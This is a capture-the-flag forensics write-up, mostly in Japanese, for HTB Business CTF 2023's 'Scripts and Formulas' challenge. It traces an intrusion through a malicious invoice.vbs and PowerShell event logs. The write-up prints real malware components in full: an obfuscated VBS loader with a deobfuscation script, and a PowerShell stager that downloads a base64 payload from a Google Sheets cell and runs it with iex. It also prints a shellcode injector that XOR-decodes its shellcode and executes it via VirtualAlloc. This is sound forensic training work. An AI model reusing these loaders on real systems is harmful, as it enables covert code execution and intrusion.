---
layout: post
title: "[Forensics] Scripts and Formulas (300 pts, 291 solved)"
published : true
permalink: /ctf/writeups/HTB_Business_CTF_2023/Forensics_ScriptsAndFormulas
tags: [CTF, WriteUps, HTB Business CTF]
---
## Description
After the last site UNZ used to rely on for the majority of Vitalium mining ran dry, the UNZ hired a local geologist to examine possible sites that were used in the past for secondary mining operations. However, after finishing the examinations, and the geologist was ready to hand in his reports, he mysteriously went missing! After months, a mysterious invoice regarding his examinations was brought up to the Department. Being new to the job, the clerk wasn't aware of the past situation and opened the Invoice. Now all of a sudden, the Arodor faction is really close to taking the lead on Vitalium mining! Given some Logs from the Clerk's Computer and the Invoice, pinpoint the intrusion methods used and how the Arodor faction gained access! To get the flag you need to answer the questions from the docker instance.

## Files
- forensics_scripts_and_formulas.zip

## Solution

Dockerインスタンスにアクセスするといくつかの設問が提示される。

### Q1
What program is being copied, renamed, and what is the final name? (Eg: notepad.exe:picture.jpeg)

chainsawで".exe"を検索してファイル名を特定した。

```sh
┌──(kali㉿kali)-[/ctf/…/htb/HTB Business CTF 2023/forensics/Scripts and Formulas]
└─$ chainsaw/chainsaw_x86_64-unknown-linux-gnu search '.exe' -i ./Windows  > chainsaw_search_.exe.log

┌──(kali㉿kali)-[/ctf/…/htb/HTB Business CTF 2023/forensics/Scripts and Formulas]
└─$ cat chainsaw_search_.exe.log|grep -i '\.exe'|grep cp
...snip....
    - "\tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.2673\r\n\tHostId=f382c247-ceb9-4e7b-a1fc-f81acb537654\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Nop -sta -noni -w hidden -c cp C:\\Windows\\System32\\cscript.exe .\\calc.exe;.\\calc.exe Invoice.vbs\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine="
...snip...
```

### Q2
What is the name of the function that is used for deobfuscating the strings, in the VBS script? (Eg: funcName)

zipファイルを展開して現れた"invoice.vbs"に記載されている。

- invoice.vbs

```vb
    Function LLdunAaXwVgKfowf(t)
        Dim msStr()
        ReDim msStr(Len(t))
        Dim jKaNZCemSwPDrmLT
        jKaNZCemSwPDrmLT = ""

```

回答: `LLdunAaXwVgKfowf`

### Q3
What program is used for executing the next stage? (Eg: notepad.exe)

"invoice.vbs"の難読化部分を可読にするスクリプトを作成した。
難読化解除後の文字列からは、"powershell.exe"が実行されることがわかる。

```python
import string

def LLdunAaXwVgKfowf(s):
    result = ''
    for c in s:
        if c == c.lower() and not c in string.digits:
            result += c
    return result

yNSlalZeGAsokjsP = LLdunAaXwVgKfowf("BcV:L\XwFiInDdDoXw7s1\9sNy4sIt9eGm") + "32" + LLdunAaXwVgKfowf("V312I\OwFiPnDdJo0wVsDp7oFw7e6r5sBhCeTl1lB\Ev81IU04") + "1.0" + LLdunAaXwVgKfowf("\9pMoBw7eTrMsDhKeVlOl1.WeMxUe")
cMtARTHTmbqbxauA = yNSlalZeGAsokjsP + " " + LLdunAaXwVgKfowf("EK-MMe4RpHW JIb9FyG7pSZaQ6s56sYB IN-4XwMT OThL2i64dSGdEXe0CnNE 9Q-X6c4V ") + chr(34) + LLdunAaXwVgKfowf("M0F$BWQuEKRrCBAlAY9 1JQ=65V QTL[KTCsEMKyRE4sTJ3tMY0eQAVmF9E.60Qt7KEeZTUxXD6t0LC.CF9eXAWn5HDcGMSoZOFdT2KiCQ3n0KNgFUN]5YP:3PY:BLLaQ2VsZMUcJAYi4MXiKCX.4I8gY2Ae0YItJYKsU8MtLZ9rMUZiM95nJH4gTDX(HZP[H4RsWZ7yOCKsMX2tNWIe02ZmOH8.BCVcE9SoAXHnP9QvDXJe3CJrD51t2LE]C2L:0M2:I66f616rSKCoFKXmMKAb3X9aGMSsWO4e") + "64" + LLdunAaXwVgKfowf("E1sFUtLBrDIiTXn9NgZG(ED'88") + "aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU=" + LLdunAaXwVgKfowf("ECK5'1Y)44)UQ;2F$B7rNGe7AsNGpMV J2=QG XBi1BnYNv8So3XkNKe70-CGrO6e54sU8tZ9m6Le6FtI8hX1oTJdXF DD-LGuXMrUKiLC AA$CVuEBrBJl") + LLdunAaXwVgKfowf(";VQI$WN2pV0XaRDAyTQDlB8RoMOWaMQ9d71C I1G=XC1 JBM$XOFrSGBeL3Qs7HNp9ZG.DH0sOC1hQ15e8VNePHVtZ8RsMS5[") + "0" + LLdunAaXwVgKfowf("7010HGS]F6H.JTWdB0Na3CHtT27aW5W[") + "0" + LLdunAaXwVgKfowf("7Z10CS0]V4E.9H0rRO1oHJEw") + "D" + LLdunAaXwVgKfowf("YP7aQTYtE3UaYLX[") + "0" + LLdunAaXwVgKfowf("OPI0J12]JUK.TK7v7J0aRTGl9B2uFO7eV11sOEC[") + "0" + LLdunAaXwVgKfowf("VKB0X4U]VO2.ZMIf4FIoD02r82Mm5NNaNIVt2Z4tH3JeYWLd") + "V" + LLdunAaXwVgKfowf("F2aESlKEuR0e5Y;R4$UAdZIeBIcL5o51dPXeEW CK=4Q LS[M8sYHyE3s82t6YeAXmB2.12cXZo2PnZKvYEeOWrK9tQN]YQ:QQ:RZfK6rJIoQVmRRbBUa6RsHOeUZ") + "64" + LLdunAaXwVgKfowf("6934MPsZAt50rIFiUYn6Sg46(HG$JFpE7aNAyVHlL9oH0aQNdUX)VA;XK$YEmM4s59 87=PT FHnETe61wYM-SYo5Bb6VjHPe3DcHQtET 7SsQ0yIKs6Pt71eBTmJQ.7GiI5oT4.SDmUQeVDmAMoRZrUGyGAsG1tK7rM9ePMaUQmTT;YF$Z1mWTsIZ.5Ww4CrBZi1CtCNeTU(W0$0LdFXe2HcDDoBAd3HeXL,") + "0" + LLdunAaXwVgKfowf("Q8Z,409 12M$S2Zd5JAeVHYc6DNoEOCdEZZeOVB.9RYlTD3eP6HnB29g1VYtHC2hHIN)FND;20Z$KJ5mJZYsFHJ.I28p0VYo48Gs1V9i91DtEPNiLLUoP49n000 DC8=F7S") + "0" + LLdunAaXwVgKfowf("1;2$Fs1rV C=W Dn8e7wB-YoMbAjXeIc4tY SsFyAsItQeNmI.8iQoY.WsGt2rBe5aDm3rReEaBdPeArR(1nCe1wI-RoPbMjNeDcWt6 BsJy7sNt2eEm5.SiZoQ.JcKoMmYp8rWeDs6sZiWoRn0.TdPe8f6lIaYtJeXsBt2rDeHaNmF(3$NmRsO,7 M[AsQyPsKt9e7mR.Hi5oD.WcEoNmDp5rRe8sMsBi4oMn1.8cLoSmQpPrHeIsCsJi2oMnEmHo5dCeA]6:X:IdEeMcRoQmLpGr1eIs4sY)T)F;A$Md7aDtXaM F=B W$OsBrH.CrWeWaVdKtXo2eAnAd1(P)E;K$Gs7r2.2cYlZoVsEeM(O)0;I$Tm0sB.YcHlNoXs6eO(P)0;IWP$TIVd5MUaSLGtSPXa") + "|iex" + chr(34)

print(cMtARTHTmbqbxauA)
```

出力:　

```
c:\windows\system32\windowspowershell\v1.0\powershell.exe -ep bypass -w hidden -c "$url = 'https://sheets.googleapis.com/v4/spreadsheets/1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ?key=AIzaSyDUpjSf7R1l1dQohA5Qv9EdyWA3KBOMc0U&ranges=Sheet1!O37&includeGridData=true';$resp = invoke-restmethod -uri $url;$payload = $resp.sheets[0].data[0].rowData[0].values[0].formattedValue;$decode = [system.convert]::frombase64string($payload);$ms = new-object system.io.memorystream;$ms.write($decode,0, $decode.length);$ms.position =0;$sr = new-object system.io.streamreader(new-object system.io.compression.deflatestream($ms, [system.io.compression.compressionmode]::decompress));$data = $sr.readtoend();$sr.close();$ms.close();$data|iex"
```

回答: `powershell.exe`

### Q4
What is the Spreadsheet ID the malicious actor downloads the next stage from? (Eg: U3ByZWFkU2hlZXQgSUQK)

Q3で可読にした文字列から読み取る。

回答: `1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ`

### Q5
What is the Sheet Name and Cell Number that houses the payload? (Eg: Sheet1:A1)

Q3で可読にした文字列から読み取る。

回答: `Sheet1:O37`

### Q6
What is the Event ID that relates to Powershell execution? (Eg: 5991)

chainsawで"powershell"を検索して現れたイベントログから判断する。

```log
---
Event:
  EventData:
    MessageNumber: 1
    MessageTotal: 1
    Path: ''
    ScriptBlockId: f1ad07f1-15f1-4992-a4da-3ffdc54c6077
    ScriptBlockText: $url = [system.text.encoding]::ascii.getstring([system.convert]::frombase64string('aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU='));$resp = invoke-restmethod -uri $url;$payload = $resp.sheets[0].data[0].rowData[0].values[0].formattedValue;$decode = [system.convert]::frombase64string($payload);$ms = new-object system.io.memorystream;$ms.write($decode,0, $decode.length);$ms.position =0;$sr = new-object system.io.streamreader(new-object system.io.compression.deflatestream($ms, [system.io.compression.compressionmode]::decompress));$data = $sr.readtoend();$sr.close();$ms.close();$data|iex
  System:
    Channel: Microsoft-Windows-PowerShell/Operational
    Computer: UNZ-RESEARCH-WS01
    Correlation_attributes:
      ActivityID: 0DA93C0A-AF83-0002-A13F-A90D83AFD901
    EventID: 4104
    EventRecordID: 78
    Execution_attributes:
      ProcessID: 5700
      ThreadID: 5240
    Keywords: '0x0'
    Level: 3
    Opcode: 15
    Provider_attributes:
      Guid: A0C1853B-5C40-4B15-8766-3CF1C58F985A
      Name: Microsoft-Windows-PowerShell
    Security_attributes:
      UserID: S-1-5-21-2954173937-1834019889-2190886044-1002
    Task: 2
    TimeCreated_attributes:
      SystemTime: 2023-07-05T10:57:23.795861Z
    Version: 1
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
```

回答: `4104`

### Q7
In the final payload, what is the XOR Key used to decrypt the shellcode? (Eg: 1337)

chainsawで"xor"を検索してXORのキーを特定した。

```sh
┌──(kali㉿kali)-[/ctf/…/htb/HTB Business CTF 2023/forensics/Scripts and Formulas]
└─$ cat chainsaw_search_xor.log
---
Event:
  EventData:
    MessageNumber: 1
    MessageTotal: 1
    Path: ''
    ScriptBlockId: a161d800-a564-40a3-aad8-4f9e02e966f7
    ScriptBlockText: "function func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL7yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCEsplEjIyOoo6sjIyNrpuNXRGsi86hrO3NnqGMDaiLzwHVuEupr3OpiqBerayL1axLjYuLqLo9iIuIbw1bSbyBvBytmGvJW+3tnqGMHaiLzRWKoL2tnqGM/aiLzYqgnq2si82J7Ynt9enlie2J6YnlroM8DYnHcw3tienlrqDHKaNzc3H5qnVRQEXwQESMjYnVqqsVros+DIiMjaqrGap8hIzenbmnlF2J3aqrHb6rSYplvVAUk3PZvqslLIiIjI3pimQqjSCPc9kkpYn1zc24S6m4S42vc42uq4Wvc42uq4mKZySz8w9z2a6rkSTNie2+qwWuq2mKZuoZXQtz2puNXKWrc7VbGy7AjIyNroM8za6rBbhLqSSdie2uq2mKZIfrrfNz2oNsjXXZroOcDfarVSWNieksjMyMjYntrqtFrEupimXuHcMbc9muq4Gqq5G4S6mqq02uq+Wuq2mKZIfrrfNz2oNsjXgt7YnR6SyNjIyNie0kjeWKZKAwsE9z2dHpimVZNbkLc9mrc7cof3NzcayLgawrla6bVVpdi3MR7SSN6auTh05aBddz2')\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\t$var_code[$x] = $var_code[$x] -bxor 35\n}\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n"
  System:
    Channel: Microsoft-Windows-PowerShell/Operational
    Computer: UNZ-RESEARCH-WS01
    Correlation_attributes:
      ActivityID: 0DA93C0A-AF83-0004-BA44-A90D83AFD901
    EventID: 4104
    EventRecordID: 79
    Execution_attributes:
      ProcessID: 5700
      ThreadID: 5240
    Keywords: '0x0'
    Level: 3
    Opcode: 15
    Provider_attributes:
      Guid: A0C1853B-5C40-4B15-8766-3CF1C58F985A
      Name: Microsoft-Windows-PowerShell
    Security_attributes:
      UserID: S-1-5-21-2954173937-1834019889-2190886044-1002
    Task: 2
    TimeCreated_attributes:
      SystemTime: 2023-07-05T10:57:24.761370Z
    Version: 1
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event

┌──(kali㉿kali)-[/ctf/…/htb/HTB Business CTF 2023/forensics/Scripts and Formulas]
└─$ chainsaw/chainsaw_x86_64-unknown-linux-gnu search 'xor' -i ./Windows  > chainsaw_search_xor.log
```

`-bxor 35`

回答: `35`



全ての設問に正解してフラグを得た。

```sh
┌──(kali㉿kali)-[/ctf/ctf-event/htb/HTB Business CTF 2023]
└─$ nc 94.237.57.58 41198

+----------------------+------------------------------------------------------------------------------------------------------------------------------------------+
|        Title         |                                                               Description                                                                |
+----------------------+------------------------------------------------------------------------------------------------------------------------------------------+
| Scripts and Formulas |                          After the last site UNZ used to rely on for the majority of Vitalium mining ran dry,                            |
|                      |                           the UNZ hired a local geologist to examine possible sites that were used in the past                           |
|                      |     for secondary mining operations. However, after finishing the examinations, and the geologist was ready to hand in his reports,      |
|                      |      he mysteriously went missing! After months, a mysterious invoice regarding his examinations was brought up to the Department.       |
|                      |                        Being new to the job, the clerk wasn't aware of the past situation and opened the Invoice.                        |
|                      |                      Now all of a sudden, the Arodor faction is really close to taking the lead on Vitalium mining!                      |
|                      | Given some Logs from the Clerk's Computer and the Invoice, pinpoint the intrusion methods used and how the Arodor faction gained access! |
+----------------------+------------------------------------------------------------------------------------------------------------------------------------------+

What program is being copied, renamed, and what is the final name? (Eg: notepad.exe:picture.jpeg)
> cscript.exe:calc.exe
[+] Correct!

What is the name of the function that is used for deobfuscating the strings, in the VBS script? (Eg: funcName)
> LLdunAaXwVgKfowf
[+] Correct!

What program is used for executing the next stage? (Eg: notepad.exe)
> powershell.exe
[+] Correct!

What is the Spreadsheet ID the malicious actor downloads the next stage from? (Eg: U3ByZWFkU2hlZXQgSUQK)
> 1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ
[+] Correct!

What is the Sheet Name and Cell Number that houses the payload? (Eg: Sheet1:A1)
> Sheet1:O37
[+] Correct!

What is the Event ID that relates to Powershell execution? (Eg: 5991)
> 4104
[+] Correct!

In the final payload, what is the XOR Key used to decrypt the shellcode? (Eg: 1337)
> 35
[+] Correct!

[+] Here is the flag: HTB{GSH33ts_4nd_str4ng3_f0rmula3_byp4ss1ng_f1r3w4lls!!}
```


